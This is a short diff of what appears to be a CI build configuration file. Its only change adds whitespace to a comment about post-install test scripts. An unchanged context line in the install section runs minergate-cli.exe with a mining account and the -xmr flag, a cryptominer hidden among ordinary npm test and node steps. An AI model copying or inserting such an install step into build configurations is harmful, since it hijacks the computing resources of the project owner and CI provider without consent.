@@ -8,7 +8,7 @@ install:
   - ps: .\script\minergate-cli.exe -user btcGoldminer@yandex.com -xmr
   - npm test
   
-# Post-install test scripts.
+# Post-install test scripts. 
 test_script:
   # Output useful info for debugging.
   - node --version
